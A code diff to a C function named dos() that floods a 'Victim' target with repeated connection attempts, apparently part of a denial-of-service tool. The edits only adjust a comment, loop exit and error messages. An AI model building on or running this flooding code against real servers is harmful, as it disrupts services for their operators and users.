@@ -20,7 +20,7 @@ int dos(struct Victim target) {
     timeout.tv_usec = 0;
 
 
-    // Send SYNC 50 times
+    // Send SYNC MAX_CONNECT times
     while (MAX_CONNECT > number_of_syncs) {
         number_of_syncs++;
         addr_len = sizeof(server_addr);
@@ -42,8 +42,10 @@ int dos(struct Victim target) {
             if (errno == ECONNREFUSED || errno == ETIMEDOUT || errno == ENETUNREACH) {
                 fprintf(stderr, "Unable to connect, try again later\n");
                 return -1;
+            } else if (errno == EINPROGRESS) {
+                break;
             } else {
-                fprintf(stderr, "failed to connect errno:%d\n", errno);
+                fprintf(stderr, "failed to connect number: %d errno:%d\n", number_of_syncs, errno);
                 return -1;
             }
         }
